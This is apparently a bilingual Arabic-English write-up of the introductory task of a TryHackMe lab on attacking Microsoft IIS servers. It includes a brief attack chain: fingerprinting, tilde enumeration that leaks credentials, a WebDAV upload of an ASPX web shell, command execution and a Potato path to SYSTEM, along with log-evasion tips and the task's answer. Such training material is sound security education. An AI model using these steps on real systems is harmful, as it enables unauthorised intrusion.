# Task 01: Introduction (المقدمة وسياق الهجمات الميدانية على خوادم IIS)

---

### المرحلة أ: نص المهمة الأصلي والأسئلة (Original Task Content & Questions)

#### English Task Description
Internet Information Services (IIS) is Microsoft's proprietary, enterprise-grade web server installed on virtually every Windows Server powering enterprise web applications, intranet portals, Active Directory web endpoints, and REST APIs. Unlike standalone web servers like Apache or Nginx on Linux, IIS is deeply intertwined with core Windows operating system components, Active Directory domain architecture, Windows authentication protocols (NTLM / Kerberos), and the .NET runtime. This tight integration makes IIS one of the most lucrative initial-access vectors in offensive operations.

**Real-World Threat Landscape:**
- **Lazarus Group (2023):** State-sponsored actors compromised vulnerable IIS servers for initial access, planting DLLs and deploying command loaders (AhnLab ASEC, 2023).
- **HAFNIUM (2021):** The threat group deployed custom ASPX web shells on IIS during the Microsoft Exchange ProxyLogon campaign to achieve long-term persistence.
- **CISA Advisory AA23-074A:** Documented widespread advanced persistent threat (APT) exploitation of CVE-2019-18935 (.NET deserialization in Progress Telerik UI) on government IIS servers, executing through `w3wp.exe` worker processes.

**Learning Objectives:**
- Fingerprint an IIS web server to identify its version, underlying Windows build, and enabled features.
- Leverage the legacy NTFS 8.3 short filename generation mechanism to perform **IIS Tilde Enumeration** and discover hidden files and unlinked directories.
- Exploit a misconfigured WebDAV instance using discovered credentials to upload and execute an ASPX command shell.
- Understand how ASPX web shells operate within the `w3wp.exe` application pool and assess privileges such as `SeImpersonatePrivilege`.
- Automate IIS reconnaissance using targeted Nmap Scripting Engine (NSE) scripts.

#### الأسئلة المطروحة (Questions):
1. I have deployed the lab machines! (Answer Format: No answer needed)

---

### المرحلة ب: التفكير التحليلي المستقل والحس الأمني (Independent Critical Thinking & OpSec)
* **القيمة الإستراتيجية لخوادم IIS في اختبارات الاختراق الميدانية:**
  * اختراق خادم Apache على لينكس قد يمنحك صدفة مقيدة كـ `www-data` في نظام ملفات معزول. بينما اختراق خادم IIS يضعك مباشرة داخل بيئة Windows، حيث غالباً ما يكون الخادم منضماً إلى نطاق Active Directory (Domain Joined)، وتشغيل صدفة ASPX يمنحك حساب `iis apppool\defaultapppool` الذي يمتلك افتراضياً امتياز `SeImpersonatePrivilege`، وهو المفتاح الذهبي للوصول إلى `NT AUTHORITY\SYSTEM` عبر تقنيات Potato.
* **البصمات السلبية والأثر العملياتي (Operational Stealth):**
  * طلبات فحص IIS المعتادة (مثل طلب ترويسات الاستجابة) تسجل في ملفات سجلات IIS التقليدية (`C:\inetpub\logs\LogFiles\W3SVC1\u_exYYMMDD.log`). معرفة ما تسجله هذه السجلات يساعد المهاجم في تقليل المعاملات غير الضرورية.

---

### المرحلة ج: التلميحات والإرشادات المتدرجة (Guided Progressive Hints)
1. **التلميح الأول (المستوى التمهيدي):**
   * هذه المهمة ترحيبية ومدخل لاستيعاب أهداف وسيناريو اختراق IIS. اضغط على زر تشغيل الآلة المعملية.
2. **التلميح الثاني (المستوى العملي):**
   * انتظر دقيقة حتى يكتمل إقلاع خادم Windows 2019 وتأكد من الاتصال عبر شبكة VPN أو جهاز AttackBox.
3. **التلميح الثالث (مستوى الحل المتقدم):**
   * السؤال لا يتطلب أي قيمة نصية؛ اضغط على Submit لاعتماده مباشرة.

---

### المرحلة د: الحل العملي الكامل والعمق التقني (Complete Practical Solution & Technical Deep Dive)

#### التحقق من الاتصال واستكشاف منفذ الويب على الهدف:
```bash
# فحص منفذ الويب HTTP 80 على خادم Windows المعملي
nmap -p 80 -sV -n -T4 MACHINE_IP
```

#### سلسلة الهجوم المتكاملة لمعمل IIS (Attack Chain Overview):
```text
1. Fingerprinting:
   curl -I http://MACHINE_IP ──▶ Server: Microsoft-IIS/10.0 + X-Powered-By: ASP.NET

2. 8.3 Tilde Enumeration:
   iis_shortname_scan.py ──▶ Discovers /BACKUP~1/ ──▶ Accesses /BackupFiles/webdav_notes.txt
                                                  └── Leaks: webdav_user:P@ssw0rd!123

3. WebDAV Exploitation:
   curl -X PUT --ntlm -u 'webdav_user:P@ssw0rd!123' -T cmd.aspx http://MACHINE_IP/webdav/cmd.aspx
   └── Returns HTTP 201 Created

4. ASPX Web Shell & Privilege Assessment:
   curl "http://MACHINE_IP/webdav/cmd.aspx?cmd=whoami /priv"
   └── Identity: iis apppool\defaultapppool
   └── Privilege: SeImpersonatePrivilege (Direct path to SYSTEM via Potato exploits)
```

---

### المرحلة هـ: الإجابات المعتمدة والقيم النهائية (Final Answer & Key Values)
* **إجابة السؤال الأول:** `No answer needed`

---

### المرحلة و: التحقق العملي وإثبات النجاح (Practical Verification & Proof of Work)
* تم بدء تشغيل الآلة والتحقق من عمل الخادم على المنفذ 80.
* تم اعتماد السؤال بنجاح على منصة TryHackMe بنسبة 100%.

---

### المرحلة ز: الاستنتاج التعليمي وجوهر الاختبار (Key Educational Takeaway)
خوادم IIS ليست مجرد مستودعات لصفحات الويب، بل هي بوابات وصول أولى (Initial Access Gates) لمنظومات Active Directory المؤسسية. فهم معمارية IIS وتكاملها مع نظام تشغيل Windows هو الأساس لتنفيذ هجمات اختراق مدروسة ومحكمة.
